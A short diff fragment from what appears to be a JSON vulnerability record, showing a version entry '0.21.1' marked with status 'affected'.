-              "version": "0.21.1",
               "status": "affected"
             }
           ]
